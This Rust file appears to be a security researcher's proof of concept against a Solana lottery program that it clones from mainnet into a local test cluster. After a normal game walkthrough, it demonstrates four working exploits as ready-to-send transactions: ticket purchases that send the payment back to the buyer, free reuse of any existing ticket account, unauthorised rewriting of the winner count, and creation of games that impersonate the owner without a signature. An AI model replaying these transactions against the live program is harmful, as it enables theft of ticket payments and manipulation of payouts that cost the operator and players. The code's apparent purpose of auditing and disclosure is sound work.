use crate::solana_client::rpc_client::RpcClient;
use crate::solana_program::instruction::AccountMeta;
use crate::solana_program::native_token::sol_to_lamports;
use crate::solana_program::system_instruction;
use crate::solana_program::system_program;
use crate::solana_sdk::commitment_config::CommitmentConfig;
use crate::solana_sdk::instruction::Instruction;
use crate::solana_sdk::pubkey::Pubkey;
use std::error::Error;
use std::str::FromStr;
use hex_literal::hex;

use poc_framework::solana_sdk::signature::Signer;
use poc_framework::*;

//used for cloning from ONLY
pub fn mainnet_client() -> RpcClient {
    RpcClient::new_with_commitment(
        "https://api.mainnet-beta.solana.com/".to_string(),
        CommitmentConfig::confirmed(),
    )
}

fn main() -> Result<(), Box<dyn Error>> {
    setup_logging(LogLevel::DEBUG);

    //the main wallet, in our example this will be the owner of games and payouts
    let game_owner = keypair(0); 
    //keypairs to use to generate new tickets
    let ticket_new = keypair(11); 
    let ticket_new2 = keypair(12); 
    //keypairs to use to generate new games
    let game_new = keypair(10); 
    let game_new2 = keypair(20);   
    let game_new3 = keypair(30);   
    //used to represent an everyday user/ticketbuyer 
    let user = keypair(77);   

    //the monnet mill program
    let milli_program = Pubkey::from_str("5d15XQp2jYPxeQtkCWoYu84zWbbFiSoHsJK39KwH2jrf")?;
    //a mainnet existing ticket
    let ticket_existing = Pubkey::from_str("FqD5EqtQvprWmK4VfV71AeDp9A3GsKVNGGcn9sydQSy4")?;
    //a mainnet existing game
    let game_existing = Pubkey::from_str("AEGHeA3cgBWaU73ue2JWBqWHgACmdFC5mruUeSp6JyS6")?;
    //the mainnet owner key of all milli libraries
    let owner_existing = Pubkey::from_str("DopvZbavQEghVDkU5NeFNdZ8pYCpQsWWmwJarATYkjoe")?;

    //a connection to mainnet to pull down live accounts and programs
    let client = mainnet_client();

    let mut env = LocalEnvironment::builder()
        //set a fixed time on the local cluster so PRNG based on timestamp is repeatable
        .set_creation_time(1639208323)
        //add our tewsting accounts with 10 SOL each
        .add_account_with_lamports(game_owner.pubkey(), system_program::ID, sol_to_lamports(10.0))
        .add_account_with_lamports(user.pubkey(), system_program::ID, sol_to_lamports(10.0))
        //pull the millionsy program from mainnet
        .clone_upgradable_program_from_cluster(&client, milli_program)
        //clone other existing mainnet accounts we want locally
        .clone_accounts_from_cluster(
            &[
                ticket_existing,
                game_existing,
                owner_existing,
            ],
            &client,
        )
        .build();

    //EXAMPLE USAGE: run through a whole game at game num 254 with us as the owner, paying a jackpot winner
    //this does not demonstrate a flaw, but rather give a platform for understanding the program

    //game owner create game
    env.execute_as_transaction(
        &[
            system_instruction::create_account(
                &game_owner.pubkey(),
                &game_new.pubkey(),
                env.get_rent_excemption(117),
                117,
                &milli_program,
            ),
            Instruction {
                program_id: milli_program,
                accounts: vec![
                    AccountMeta::new(game_new.pubkey(), true),
                    AccountMeta::new(game_owner.pubkey(), false),
                ],
                //op, create time, ticket cost, round
                data: hex!["00 d980f59e 7d010000 024ba200 00000000 FE"].to_vec(),
            },
        ],
        &[&game_owner, &game_new],
    )
    .print();

    //user buy ticket
    env.execute_as_transaction(
        &[
            system_instruction::create_account(
                &user.pubkey(),
                &ticket_new.pubkey(),
                env.get_rent_excemption(72),
                72,
                &milli_program,
            ),
            Instruction {
                program_id: milli_program,
                accounts: vec![
                    AccountMeta::new(user.pubkey(), true),
                    AccountMeta::new(ticket_new.pubkey(), false),
                    AccountMeta::new(game_new.pubkey(), false),
                    AccountMeta::new(game_owner.pubkey(), false),
                    AccountMeta::new_readonly(system_program::id(), false),
                ],
                data: vec![0x01, 0x26, 0x25, 0x0A, 0x0C, 0x24, 0x16],
            },
        ],
        &[&user, &ticket_new],
    )
    .print();

    let out = hex!["6ef66d4e00000000626e61240000000084d591280000000019a3220000000000e321825a00000000e578a12900000000"];
    let n1 = u64::from_le_bytes(out[0..8].try_into()?);
    println!("n1 is {}", n1);
    let n2 = u64::from_le_bytes(out[8..16].try_into()?);
    println!("n2 is {}", n2);
    let n3 = u64::from_le_bytes(out[16..24].try_into()?);
    println!("n3 is {}", n3);
    let n4 = u64::from_le_bytes(out[24..32].try_into()?);
    println!("n4 is {}", n4);
    let n5 = u64::from_le_bytes(out[32..40].try_into()?);
    println!("n5 is {}", n5);
    let n6 = u64::from_le_bytes(out[40..].try_into()?);
    println!("n6 is {}", n6);

    //game owner post randomness
    env.execute_as_transaction(
        &[
            Instruction {
                program_id: milli_program,
                accounts: vec![
                    AccountMeta::new(game_new.pubkey(), false),
                    AccountMeta::new(game_owner.pubkey(), true),
                ],
                data: hex!["026ef66d4e00000000626e61240000000084d591280000000019a3220000000000e321825a00000000e578a12900000000"].to_vec(),
            },
        ],
        &[&game_owner],
    )
    .print();

    //game owner sets data for how many tickets won
    env.execute_as_transaction(
        &[
            Instruction {
                program_id: milli_program,
                accounts: vec![
                    AccountMeta::new(game_new.pubkey(), false),
                    AccountMeta::new(game_owner.pubkey(), true),
                ],
                data: hex!["0300000001"].to_vec(),
            },
        ],
        &[&game_owner],
    )
    .print();

    //game owner pays winner
    env.execute_as_transaction(
        &[
            Instruction {
                program_id: milli_program,
                accounts: vec![
                    AccountMeta::new(game_new.pubkey(), false),
                    AccountMeta::new(game_owner.pubkey(), true),
                    AccountMeta::new(user.pubkey(), false),
                    AccountMeta::new(ticket_new.pubkey(), false),
                    AccountMeta::new_readonly(system_program::id(), false),
                ],
                data: hex!["04"].to_vec(),
            },
        ],
        &[&game_owner],
    )
    .print();

    //note: 05 close game left out of flow (properly checked)
    //note: 06 update price left out of flow (properly checked)

    /***************************************
    NOW FOR THE FLAWS
    */

    //game owner create new game (setup)
    env.execute_as_transaction(
        &[
            system_instruction::create_account(
                &game_owner.pubkey(),
                &game_new3.pubkey(),
                env.get_rent_excemption(117),
                117,
                &milli_program,
            ),
            Instruction {
                program_id: milli_program,
                accounts: vec![
                    AccountMeta::new(game_new3.pubkey(), true),
                    AccountMeta::new(game_owner.pubkey(), false),
                ],
                //op, create time, ticket cost, round
                data: hex!["00 d980f59e 7d010000 024ba200 00000000 FF"].to_vec(),
            },
        ],
        &[&game_owner, &game_new3],
    )
    .print();

    println!("************************   FLAW 1   *****************************************************************");
    //******************* FLAW 1 ********************* */
    //buy ticket without paying more than ticket account rent
    env.execute_as_transaction(
        &[
            system_instruction::create_account(
                &user.pubkey(),
                &ticket_new2.pubkey(),
                env.get_rent_excemption(72),
                72,
                &milli_program,
            ),
            Instruction {
                program_id: milli_program,
                accounts: vec![
                    AccountMeta::new(user.pubkey(), true),
                    AccountMeta::new(ticket_new2.pubkey(), false),
                    AccountMeta::new(game_new3.pubkey(), false),

                    //right here, we can send any account we want as the account to receive the ticket
                    //payment.  In this case, we're sending it back to ourselves.
                    //This effectively reduces the cost of a ticket to the cost of rent.
                    //AccountMeta::new(owner_existing, false),
                    AccountMeta::new(user.pubkey(), false),
                    
                    AccountMeta::new_readonly(system_program::id(), false),
                ],
                data: vec![0x01, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06],
            },
        ],
        &[&user, &ticket_new2],
    )
    .print();

    println!("************************   FLAW 2   *****************************************************************");
    //******************* FLAW 2 ********************* */
    //buy ticket without paying at all by reusing an old ticket account
    //this works with ANY users ticket - even from prior games
    env.execute_as_transaction(
        &[
            Instruction {
                program_id: milli_program,
                accounts: vec![
                    AccountMeta::new(user.pubkey(), true),
                    AccountMeta::new(ticket_existing, false),
                    AccountMeta::new(game_new3.pubkey(), false),

                    //again, use ourselves as payment
                    //AccountMeta::new(owner_existing, false),
                    AccountMeta::new(user.pubkey(), true),
                    
                    AccountMeta::new_readonly(system_program::id(), false),
                ],
                data: vec![0x01, 0x06, 0x05, 0x04, 0x03, 0x02, 0x01],
            },
        ],
        &[&user],
    )
    .print();

    println!("************************   FLAW 3   *****************************************************************");
    //******************* FLAW 3 ********************* */
    //update game account as anyone
    //this could be used to change the # of winners of a round with multiple winners
    //affecting payout in the tx 3 seconds later (change from 2 winners to 1)
    env.execute_as_transaction(
        &[
            Instruction {
                program_id: milli_program,
                accounts: vec![
                    AccountMeta::new(game_existing, false),
                    AccountMeta::new(user.pubkey(), true),
                ],
                //makes the UI show that there are 254 winners of all match types
                data: hex!["03FFFFFFFF"].to_vec(),
            },
        ],
        &[&user],
    )
    .print();
    
    println!("************************   FLAW 4   *****************************************************************");
    //******************* FLAW 4 ********************* */
    //create a game that looks like the owner made it
    env.execute_as_transaction(
        &[
            system_instruction::create_account(
                &user.pubkey(),
                &game_new2.pubkey(),
                env.get_rent_excemption(117),
                117,
                &milli_program,
            ),
            Instruction {
                program_id: milli_program,
                accounts: vec![
                    AccountMeta::new(game_new2.pubkey(), true),
                    AccountMeta::new(owner_existing, false), //no sign needed
                ],
                data: hex!["00 d980f59e 7d010000 024ba200 00000000 2F"].to_vec(),
            },
        ],
        &[&user, &game_new2],
    )
    .print();

    Ok(())
}

